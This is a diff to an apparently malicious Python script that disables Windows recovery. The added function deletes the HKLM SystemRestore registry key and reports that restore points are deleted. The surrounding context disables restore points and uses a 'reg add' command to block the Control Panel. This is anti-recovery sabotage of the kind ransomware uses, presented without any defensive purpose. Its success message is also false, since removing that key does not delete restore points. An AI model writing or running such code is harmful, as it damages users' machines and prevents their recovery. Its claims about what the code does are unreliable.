@@ -34,6 +34,15 @@ def disable_restore_points():
 # Call the function to disable restore points
 disable_restore_points()
 
+def delete_restore_points():
+    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
+    try:
+        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
+        print("Restore points deleted successfully.")
+    except Exception as e:
+        print("An error occurred:", e)
+
+
 def disable_control_panel():
     os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")
 
